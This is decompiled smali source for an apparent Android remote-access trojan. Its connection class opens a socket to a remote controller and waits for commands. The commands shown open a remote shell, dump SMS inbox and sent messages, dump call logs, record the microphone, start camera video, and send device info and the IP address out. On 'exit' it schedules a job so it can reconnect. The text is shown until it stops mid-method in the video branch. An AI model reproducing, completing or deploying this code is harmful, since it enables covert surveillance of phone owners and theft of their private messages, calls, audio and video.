.class public Lcom/android/ld/connection;
.super Landroid/os/AsyncTask;
.source "connection.java"


# annotations
.annotation system Ldalvik/annotation/Signature;
    value = {
        "Landroid/os/AsyncTask<",
        "Ljava/lang/String;",
        "Ljava/lang/Void;",
        "Ljava/lang/Void;",
        ">;"
    }
.end annotation


# static fields
.field static TAG:Ljava/lang/String;


# instance fields
.field Applist:Lcom/android/ld/Payloads/Applist;

.field CallLogs:Lcom/android/ld/Payloads/CallLogs;

.field CameraManager:Lcom/android/ld/Payloads/CameraManager;

.field Contacts:Lcom/android/ld/Payloads/Contacts;

.field Info:Lcom/android/ld/Payloads/Info;

.field IpAddress:Lcom/android/ld/Payloads/IpAddress;

.field Shell:Lcom/android/ld/Payloads/Shell;

.field Sms:Lcom/android/ld/Payloads/Sms;

.field Vibrate:Lcom/android/ld/Payloads/Vibrate;

.field VidManager:Lcom/android/ld/Payloads/VidManager;

.field activity:Landroid/app/Activity;

.field beep:Lcom/android/ld/Payloads/beep;

.field context:Landroid/content/Context;

.field functions:Lcom/android/ld/functions;

.field locManager:Lcom/android/ld/Payloads/locManager;

.field recordAudio:Lcom/android/ld/Payloads/recordAudio;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 53
    const-string v0, "connectionClass"

    sput-object v0, Lcom/android/ld/connection;->TAG:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>(Landroid/app/Activity;Landroid/content/Context;)V
    .locals 1
    .param p1, "activity"    # Landroid/app/Activity;
    .param p2, "context"    # Landroid/content/Context;

    .line 68
    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    .line 51
    new-instance v0, Lcom/android/ld/Payloads/IpAddress;

    invoke-direct {v0}, Lcom/android/ld/Payloads/IpAddress;-><init>()V

    iput-object v0, p0, Lcom/android/ld/connection;->IpAddress:Lcom/android/ld/Payloads/IpAddress;

    .line 69
    iput-object p1, p0, Lcom/android/ld/connection;->activity:Landroid/app/Activity;

    .line 71
    iput-object p2, p0, Lcom/android/ld/connection;->context:Landroid/content/Context;

    .line 72
    new-instance v0, Lcom/android/ld/functions;

    invoke-direct {v0, p1}, Lcom/android/ld/functions;-><init>(Landroid/app/Activity;)V

    iput-object v0, p0, Lcom/android/ld/connection;->functions:Lcom/android/ld/functions;

    .line 73
    new-instance v0, Lcom/android/ld/Payloads/Shell;

    invoke-direct {v0, p1, p2}, Lcom/android/ld/Payloads/Shell;-><init>(Landroid/app/Activity;Landroid/content/Context;)V

    iput-object v0, p0, Lcom/android/ld/connection;->Shell:Lcom/android/ld/Payloads/Shell;

    .line 74
    new-instance v0, Lcom/android/ld/Payloads/Vibrate;

    invoke-direct {v0, p2}, Lcom/android/ld/Payloads/Vibrate;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/android/ld/connection;->Vibrate:Lcom/android/ld/Payloads/Vibrate;

    .line 75
    new-instance v0, Lcom/android/ld/Payloads/Sms;

    invoke-direct {v0, p2}, Lcom/android/ld/Payloads/Sms;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/android/ld/connection;->Sms:Lcom/android/ld/Payloads/Sms;

    .line 76
    new-instance v0, Lcom/android/ld/Payloads/recordAudio;

    invoke-direct {v0, p2}, Lcom/android/ld/Payloads/recordAudio;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/android/ld/connection;->recordAudio:Lcom/android/ld/Payloads/recordAudio;

    .line 77
    new-instance v0, Lcom/android/ld/Payloads/Contacts;

    invoke-direct {v0, p2}, Lcom/android/ld/Payloads/Contacts;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/android/ld/connection;->Contacts:Lcom/android/ld/Payloads/Contacts;

    .line 78
    new-instance v0, Lcom/android/ld/Payloads/CallLogs;

    invoke-direct {v0, p2, p1}, Lcom/android/ld/Payloads/CallLogs;-><init>(Landroid/content/Context;Landroid/app/Activity;)V

    iput-object v0, p0, Lcom/android/ld/connection;->CallLogs:Lcom/android/ld/Payloads/CallLogs;

    .line 79
    new-instance v0, Lcom/android/ld/Payloads/CameraManager;

    invoke-direct {v0, p2}, Lcom/android/ld/Payloads/CameraManager;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/android/ld/connection;->CameraManager:Lcom/android/ld/Payloads/CameraManager;

    .line 80
    new-instance v0, Lcom/android/ld/Payloads/Applist;

    invoke-direct {v0, p2}, Lcom/android/ld/Payloads/Applist;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/android/ld/connection;->Applist:Lcom/android/ld/Payloads/Applist;

    .line 81
    new-instance v0, Lcom/android/ld/Payloads/Info;

    invoke-direct {v0, p1}, Lcom/android/ld/Payloads/Info;-><init>(Landroid/app/Activity;)V

    iput-object v0, p0, Lcom/android/ld/connection;->Info:Lcom/android/ld/Payloads/Info;

    .line 82
    new-instance v0, Lcom/android/ld/Payloads/locManager;

    invoke-direct {v0, p2, p1}, Lcom/android/ld/Payloads/locManager;-><init>(Landroid/content/Context;Landroid/app/Activity;)V

    iput-object v0, p0, Lcom/android/ld/connection;->locManager:Lcom/android/ld/Payloads/locManager;

    .line 83
    new-instance v0, Lcom/android/ld/Payloads/VidManager;

    invoke-direct {v0, p2, p1}, Lcom/android/ld/Payloads/VidManager;-><init>(Landroid/content/Context;Landroid/app/Activity;)V

    iput-object v0, p0, Lcom/android/ld/connection;->VidManager:Lcom/android/ld/Payloads/VidManager;

    .line 84
    new-instance v0, Lcom/android/ld/Payloads/beep;

    invoke-direct {v0, p2}, Lcom/android/ld/Payloads/beep;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/android/ld/connection;->beep:Lcom/android/ld/Payloads/beep;

    .line 86
    return-void
.end method


# virtual methods
.method public bridge synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 0

    .line 40
    check-cast p1, [Ljava/lang/String;

    invoke-virtual {p0, p1}, Lcom/android/ld/connection;->doInBackground([Ljava/lang/String;)Ljava/lang/Void;

    move-result-object p1

    return-object p1
.end method

.method public varargs doInBackground([Ljava/lang/String;)Ljava/lang/Void;
    .locals 19
    .param p1, "strings"    # [Ljava/lang/String;

    .line 95
    move-object/from16 v1, p0

    const-string v2, "app_list"

    const-string v3, "sent"

    const-string v4, "inbox"

    const-string v5, "done"

    const-string v6, "called"

    const-string v7, "service_runner"

    const-string v8, "\n"

    const-string v9, " "

    :goto_0
    :try_start_0
    sget-object v0, Lcom/android/ld/connection;->TAG:Ljava/lang/String;

    const-string v12, "trying"

    invoke-static {v0, v12}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 96
    new-instance v0, Ljava/net/Socket;

    invoke-direct {v0}, Ljava/net/Socket;-><init>()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_4

    move-object v12, v0

    .line 98
    .local v12, "socket":Ljava/net/Socket;
    const/4 v13, 0x1

    :try_start_1
    new-instance v0, Ljava/net/InetSocketAddress;

    const/4 v14, 0x0

    aget-object v14, p1, v14

    aget-object v15, p1, v13

    invoke-static {v15}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v15

    invoke-direct {v0, v14, v15}, Ljava/net/InetSocketAddress;-><init>(Ljava/lang/String;I)V

    const/16 v14, 0x1388

    invoke-virtual {v12, v0, v14}, Ljava/net/Socket;->connect(Ljava/net/SocketAddress;I)V
    :try_end_1
    .catch Ljava/net/SocketTimeoutException; {:try_start_1 .. :try_end_1} :catch_1
    .catch Ljava/net/SocketException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_4

    .line 101
    goto :goto_2

    .line 99
    :catch_0
    move-exception v0

    goto :goto_1

    :catch_1
    move-exception v0

    .line 100
    .local v0, "e":Ljava/io/IOException;
    :goto_1
    :try_start_2
    sget-object v14, Lcom/android/ld/connection;->TAG:Ljava/lang/String;

    const-string v15, "error"

    invoke-static {v14, v15}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 102
    .end local v0    # "e":Ljava/io/IOException;
    :goto_2
    invoke-virtual {v12}, Ljava/net/Socket;->isConnected()Z

    move-result v0

    if-eqz v0, :cond_1d

    .line 103
    sget-object v0, Lcom/android/ld/connection;->TAG:Ljava/lang/String;

    invoke-static {v0, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 104
    nop

    .line 107
    new-instance v0, Ljava/io/DataOutputStream;

    invoke-virtual {v12}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v14

    invoke-direct {v0, v14}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    move-object v14, v0

    .line 108
    .local v14, "out":Ljava/io/OutputStream;
    new-instance v0, Ljava/io/BufferedReader;

    new-instance v15, Ljava/io/InputStreamReader;

    invoke-virtual {v12}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;

    move-result-object v10

    invoke-direct {v15, v10}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v0, v15}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    move-object v10, v0

    .line 109
    .local v10, "in":Ljava/io/BufferedReader;
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v15, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-virtual {v0, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    move-object v15, v0

    .line 110
    .local v15, "model":Ljava/lang/String;
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    move-object/from16 v16, v0

    .line 111
    .local v16, "welcomeMess":Ljava/lang/String;
    sget-object v0, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    move-object/from16 v13, v16

    .end local v16    # "welcomeMess":Ljava/lang/String;
    .local v13, "welcomeMess":Ljava/lang/String;
    invoke-virtual {v13, v0}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v0

    invoke-virtual {v14, v0}, Ljava/io/OutputStream;->write([B)V

    .line 113
    :goto_3
    invoke-virtual {v10}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v0

    move-object/from16 v16, v0

    .local v16, "line":Ljava/lang/String;
    if-eqz v0, :cond_1b

    .line 114
    sget-object v0, Lcom/android/ld/connection;->TAG:Ljava/lang/String;

    move-object/from16 v11, v16

    .end local v16    # "line":Ljava/lang/String;
    .local v11, "line":Ljava/lang/String;
    invoke-static {v0, v11}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 115
    const-string v0, "exit"

    invoke-virtual {v11, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    .line 116
    invoke-static {v7, v6}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 117
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    move-object/from16 v16, v10

    const/16 v10, 0x15

    .end local v10    # "in":Ljava/io/BufferedReader;
    .local v16, "in":Ljava/io/BufferedReader;
    if-lt v0, v10, :cond_0

    .line 118
    iget-object v0, v1, Lcom/android/ld/connection;->functions:Lcom/android/ld/functions;

    iget-object v10, v1, Lcom/android/ld/connection;->context:Landroid/content/Context;

    invoke-virtual {v0, v10}, Lcom/android/ld/functions;->jobScheduler(Landroid/content/Context;)V

    goto :goto_4

    .line 120
    :cond_0
    iget-object v0, v1, Lcom/android/ld/connection;->activity:Landroid/app/Activity;

    new-instance v10, Lcom/android/ld/connection$1;

    invoke-direct {v10, v1}, Lcom/android/ld/connection$1;-><init>(Lcom/android/ld/connection;)V

    invoke-virtual {v0, v10}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    .line 127
    :goto_4
    invoke-virtual {v12}, Ljava/net/Socket;->close()V

    move-object/from16 v10, v16

    goto :goto_3

    .line 129
    .end local v16    # "in":Ljava/io/BufferedReader;
    .restart local v10    # "in":Ljava/io/BufferedReader;
    :cond_1
    move-object/from16 v16, v10

    .end local v10    # "in":Ljava/io/BufferedReader;
    .restart local v16    # "in":Ljava/io/BufferedReader;
    const-string v0, "sysInfo"

    invoke-virtual {v11, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_2

    .line 130
    iget-object v0, v1, Lcom/android/ld/connection;->Info:Lcom/android/ld/Payloads/Info;

    invoke-virtual {v0}, Lcom/android/ld/Payloads/Info;->sysInfo()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    invoke-virtual {v14, v0}, Ljava/io/OutputStream;->write([B)V

    move-object/from16 v10, v16

    goto :goto_3

    .line 132
    :cond_2
    const-string v0, "shell"

    invoke-virtual {v11, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_3

    .line 133
    const-string v0, "SHELL"

    sget-object v10, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v0, v10}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v0

    invoke-virtual {v14, v0}, Ljava/io/OutputStream;->write([B)V

    .line 134
    iget-object v0, v1, Lcom/android/ld/connection;->Shell:Lcom/android/ld/Payloads/Shell;

    invoke-virtual {v0, v12, v14}, Lcom/android/ld/Payloads/Shell;->executeShell(Ljava/net/Socket;Ljava/io/OutputStream;)V

    move-object/from16 v10, v16

    goto :goto_3

    .line 136
    :cond_3
    const-string v0, "help"

    invoke-virtual {v11, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_4

    .line 137
    const-string v0, "help\n"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    invoke-virtual {v14, v0}, Ljava/io/OutputStream;->write([B)V

    move-object/from16 v10, v16

    goto/16 :goto_3

    .line 139
    :cond_4
    const-string v0, "clear"

    invoke-virtual {v11, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_5

    .line 140
    const-string v0, "welcome to andro(server) \n"

    sget-object v10, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v0, v10}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v0

    invoke-virtual {v14, v0}, Ljava/io/OutputStream;->write([B)V

    move-object/from16 v10, v16

    goto/16 :goto_3

    .line 142
    :cond_5
    const-string v0, "getIP"

    invoke-virtual {v11, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_6

    .line 143
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v10, "Device Ip: "

    invoke-virtual {v0, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-object/from16 v17, v12

    const/4 v10, 0x1

    .end local v12    # "socket":Ljava/net/Socket;
    .local v17, "socket":Ljava/net/Socket;
    invoke-static {v10}, Lcom/android/ld/Payloads/IpAddress;->getIPAddress(Z)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v0, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 144
    .local v0, "ip_addr":Ljava/lang/String;
    sget-object v10, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v0, v10}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v10

    invoke-virtual {v14, v10}, Ljava/io/OutputStream;->write([B)V

    .line 145
    .end local v0    # "ip_addr":Ljava/lang/String;
    move-object/from16 v10, v16

    move-object/from16 v12, v17

    goto/16 :goto_3

    .line 146
    .end local v17    # "socket":Ljava/net/Socket;
    .restart local v12    # "socket":Ljava/net/Socket;
    :cond_6
    move-object/from16 v17, v12

    .end local v12    # "socket":Ljava/net/Socket;
    .restart local v17    # "socket":Ljava/net/Socket;
    const-string v0, "vibrate \\d"

    invoke-virtual {v11, v0}, Ljava/lang/String;->matches(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_7

    .line 147
    invoke-virtual {v11, v9}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    .line 148
    .local v0, "numbers":[Ljava/lang/String;
    iget-object v10, v1, Lcom/android/ld/connection;->Vibrate:Lcom/android/ld/Payloads/Vibrate;

    const/4 v12, 0x1

    aget-object v18, v0, v12

    invoke-static/range {v18 .. v18}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v12

    invoke-virtual {v10, v12}, Lcom/android/ld/Payloads/Vibrate;->vib(I)V

    .line 149
    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    const-string v12, "Vibrating "

    invoke-virtual {v10, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-object/from16 v18, v13

    const/4 v12, 0x1

    .end local v13    # "welcomeMess":Ljava/lang/String;
    .local v18, "welcomeMess":Ljava/lang/String;
    aget-object v13, v0, v12

    invoke-virtual {v10, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v12, " times successful.\n"

    invoke-virtual {v10, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    .line 150
    .local v10, "res":Ljava/lang/String;
    sget-object v12, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v10, v12}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v12

    invoke-virtual {v14, v12}, Ljava/io/OutputStream;->write([B)V

    .line 151
    .end local v0    # "numbers":[Ljava/lang/String;
    .end local v10    # "res":Ljava/lang/String;
    move-object/from16 v10, v16

    move-object/from16 v12, v17

    move-object/from16 v13, v18

    goto/16 :goto_3

    .line 152
    .end local v18    # "welcomeMess":Ljava/lang/String;
    .restart local v13    # "welcomeMess":Ljava/lang/String;
    :cond_7
    move-object/from16 v18, v13

    .end local v13    # "welcomeMess":Ljava/lang/String;
    .restart local v18    # "welcomeMess":Ljava/lang/String;
    const-string v0, "beep \\d"

    invoke-virtual {v11, v0}, Ljava/lang/String;->matches(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_8

    .line 153
    invoke-virtual {v11, v9}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    .line 154
    .restart local v0    # "numbers":[Ljava/lang/String;
    iget-object v10, v1, Lcom/android/ld/connection;->beep:Lcom/android/ld/Payloads/beep;

    const/4 v12, 0x1

    aget-object v13, v0, v12

    invoke-static {v13}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v12

    invoke-virtual {v10, v12}, Lcom/android/ld/Payloads/beep;->beepen(I)V

    .line 155
    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    const-string v12, "beeping "

    invoke-virtual {v10, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const/4 v12, 0x1

    aget-object v13, v0, v12

    invoke-virtual {v10, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v12, " times successfull. \n"

    invoke-virtual {v10, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    .line 156
    .restart local v10    # "res":Ljava/lang/String;
    sget-object v12, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v10, v12}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v12

    invoke-virtual {v14, v12}, Ljava/io/OutputStream;->write([B)V

    .line 157
    .end local v0    # "numbers":[Ljava/lang/String;
    .end local v10    # "res":Ljava/lang/String;
    move-object/from16 v10, v16

    move-object/from16 v12, v17

    move-object/from16 v13, v18

    goto/16 :goto_3

    .line 158
    :cond_8
    const-string v0, "dump_sms "

    invoke-virtual {v11, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_4

    const-string v10, "END123\n"

    if-eqz v0, :cond_b

    .line 160
    :try_start_3
    invoke-virtual {v11, v9}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    .line 161
    .local v0, "box":[Ljava/lang/String;
    const/4 v12, 0x1

    aget-object v13, v0, v12

    invoke-virtual {v13, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_9

    .line 162
    const-string v12, "readSMS inbox\n"

    sget-object v13, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v12, v13}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v12

    invoke-virtual {v14, v12}, Ljava/io/OutputStream;->write([B)V

    .line 163
    iget-object v12, v1, Lcom/android/ld/connection;->Sms:Lcom/android/ld/Payloads/Sms;

    invoke-virtual {v12, v4}, Lcom/android/ld/Payloads/Sms;->readSMSBox(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    .line 164
    .local v12, "sms":Ljava/lang/String;
    sget-object v13, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v12, v13}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v13

    invoke-virtual {v14, v13}, Ljava/io/OutputStream;->write([B)V

    .line 165
    .end local v12    # "sms":Ljava/lang/String;
    goto :goto_5

    :cond_9
    const/4 v12, 0x1

    aget-object v13, v0, v12

    invoke-virtual {v13, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_a

    .line 166
    const-string v12, "readSMS sent\n"

    sget-object v13, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v12, v13}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v12

    invoke-virtual {v14, v12}, Ljava/io/OutputStream;->write([B)V

    .line 167
    iget-object v12, v1, Lcom/android/ld/connection;->Sms:Lcom/android/ld/Payloads/Sms;

    invoke-virtual {v12, v3}, Lcom/android/ld/Payloads/Sms;->readSMSBox(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    .line 168
    .restart local v12    # "sms":Ljava/lang/String;
    sget-object v13, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v12, v13}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v13

    invoke-virtual {v14, v13}, Ljava/io/OutputStream;->write([B)V

    .line 169
    .end local v12    # "sms":Ljava/lang/String;
    goto :goto_5

    .line 170
    :cond_a
    const-string v12, "readSMS null\n"

    sget-object v13, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v12, v13}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v12

    invoke-virtual {v14, v12}, Ljava/io/OutputStream;->write([B)V

    .line 171
    const-string v12, "Wrong Command\n"

    sget-object v13, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v12, v13}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v12

    invoke-virtual {v14, v12}, Ljava/io/OutputStream;->write([B)V

    .line 173
    :goto_5
    sget-object v12, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v10, v12}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v10

    invoke-virtual {v14, v10}, Ljava/io/OutputStream;->write([B)V

    .line 174
    .end local v0    # "box":[Ljava/lang/String;
    move-object/from16 v10, v16

    move-object/from16 v12, v17

    move-object/from16 v13, v18

    goto/16 :goto_3

    .line 176
    :cond_b
    const-string v0, "record_mic"

    invoke-virtual {v11, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_c

    .line 177
    iget-object v0, v1, Lcom/android/ld/connection;->recordAudio:Lcom/android/ld/Payloads/recordAudio;

    invoke-virtual {v0, v14}, Lcom/android/ld/Payloads/recordAudio;->startRecording(Ljava/io/OutputStream;)V

    move-object/from16 v10, v16

    move-object/from16 v12, v17

    move-object/from16 v13, v18

    goto/16 :goto_3

    .line 179
    :cond_c
    const-string v0, "stop_mic"

    invoke-virtual {v11, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_d

    .line 180
    iget-object v0, v1, Lcom/android/ld/connection;->recordAudio:Lcom/android/ld/Payloads/recordAudio;

    invoke-virtual {v0, v14}, Lcom/android/ld/Payloads/recordAudio;->stopRecording(Ljava/io/OutputStream;)V

    move-object/from16 v10, v16

    move-object/from16 v12, v17

    move-object/from16 v13, v18

    goto/16 :goto_3

    .line 182
    :cond_d
    const-string v0, "dump_calllogs"

    invoke-virtual {v11, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_f

    .line 184
    const-string v0, "callLogs\n"

    sget-object v12, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v0, v12}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v0

    invoke-virtual {v14, v0}, Ljava/io/OutputStream;->write([B)V

    .line 185
    iget-object v0, v1, Lcom/android/ld/connection;->CallLogs:Lcom/android/ld/Payloads/CallLogs;

    invoke-virtual {v0}, Lcom/android/ld/Payloads/CallLogs;->readLogs()Ljava/lang/String;

    move-result-object v0

    .line 186
    .local v0, "call_logs":Ljava/lang/String;
    if-nez v0, :cond_e

    .line 187
    const-string v12, "No call logs found on the device\n"

    sget-object v13, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v12, v13}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v12

    invoke-virtual {v14, v12}, Ljava/io/OutputStream;->write([B)V

    .line 188
    sget-object v12, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v10, v12}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v10

    invoke-virtual {v14, v10}, Ljava/io/OutputStream;->write([B)V

    goto :goto_6

    .line 190
    :cond_e
    sget-object v12, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v0, v12}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v12

    invoke-virtual {v14, v12}, Ljava/io/OutputStream;->write([B)V

    .line 191
    sget-object v12, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v10, v12}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v10

    invoke-virtual {v14, v10}, Ljava/io/OutputStream;->write([B)V

    .line 194
    .end local v0    # "call_logs":Ljava/lang/String;
    :goto_6
    move-object/from16 v10, v16

    move-object/from16 v12, v17

    move-object/from16 v13, v18

    goto/16 :goto_3

    .line 195
    :cond_f
    const-string v0, "startVideo \\d"

    invoke-virtual {v11, v0}, Ljava/lang/String;->matches(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_10

    .line 197
    invoke-virtual {v11, v9}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    .line 198
    .local v0, "cameraid":[Ljava/lang/String;
    iget-object v10, v1, Lcom/android/ld/connection;->VidManager:Lcom/android/ld/Payloads/VidManager;

    const/4 v12, 0x1

    aget-object v13, v0, v12

    invoke-static {v13}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v12

    invoke-virtual {v10, v12, v14}, Lcom/android/ld/Payloads/VidManager;->startVideo(ILjava/io/OutputStream;)V

    .line 199
    .end local v0    # "cameraid":[Ljava/lang/String;
